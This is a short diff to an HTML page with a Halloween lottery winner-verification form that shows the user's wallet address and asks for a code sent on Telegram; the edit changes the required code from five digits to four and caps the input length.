@@ -169,7 +169,7 @@
 						<div>
 							<p><b>Halloween lottery - Winner Verfification</b></p>
 							<p>
-							our lottery has ended. Please enter the 5 digits code you got on Telegram.
+							our lottery has ended. Please enter the 4 digits code you got on Telegram.
 							</p>
 							
 							<p><span><b>Your Address: </b></span><span id="lottery_currentAddressNode"></span></p>
@@ -177,7 +177,7 @@
 							<div id="walletChecker_thx" style="display: none; color: green;padding: 32px;padding-left: 0;">Thank you for sending a verification code! we will contact you on Telegram.</div>
 
 							<p><span class="post-date">Code:</span></p>
-							<input class="form-control" id="walletChecker_code" type="number" style="margin-top: 16px;margin-bottom: 16px; width: 120px;">
+							<input class="form-control" id="walletChecker_code" type="number" maxlength="4" style="margin-top: 16px;margin-bottom: 16px; width: 120px;">
 
 							<button style="margin-bottom: 16px;" class="btn btn-lg btn-sell" onclick="lottery_WalletChecker_sendCode(document.getElementById('walletChecker_code').value, function(){})" role="button">👻 Send</button>
 					</div>
